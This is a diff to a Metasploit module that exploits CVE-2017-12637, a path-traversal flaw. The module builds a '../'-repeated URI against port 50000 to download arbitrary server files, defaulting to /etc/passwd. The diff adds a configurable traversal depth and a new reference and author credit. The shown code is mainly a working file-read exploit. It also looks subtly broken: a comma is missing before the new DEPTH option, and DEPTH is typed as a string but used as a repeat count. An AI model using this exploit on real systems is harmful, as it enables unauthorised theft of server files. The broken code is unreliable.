@@ -17,10 +17,12 @@ class MetasploitModule < Msf::Auxiliary
       'References'     =>
         [
           [ 'CVE', '2017-12637' ],
+          ['URL', 'http://web.archive.org/web/20170807202056/http://www.sh0w.top/index.php/archives/7/'],
           [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-12637' ],
         ],
       'Author'         =>
         [
+          '我不兽', # Discovery and PoC
           'Vahagn @vah_13 Vardanian'
         ],
       'License'        => MSF_LICENSE,
@@ -31,6 +33,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(50000),
         OptString.new("FILEPATH", [true, 'Set a file path on the server', '/etc/passwd'])
+        OptString.new("DEPTH", [true, 'Set a ../ count', 15])
       ])
 
     deregister_options('RHOST')
@@ -46,13 +49,13 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Attempting to download: #{datastore['FILEPATH']}")
 
     # Create request
-    traversal = "/../../../../../../../../../../../../../../../../"
-    res = send_request_raw({
+    traversal = "../" * datastore['DEPTH']
+    res = send_request_cgi({
       'method' => 'GET',
       'uri'    => "/scheduler/ui/js/?#{traversal}/#{datastore['FILEPATH']}"
     }, 25)
 
-    print_status("Server returns HTTP code: #{res.code.to_s}")
+    print_status("Server returns HTTP code: #{res.code}")
 
     # Show data if needed
     if res and res.code == 200
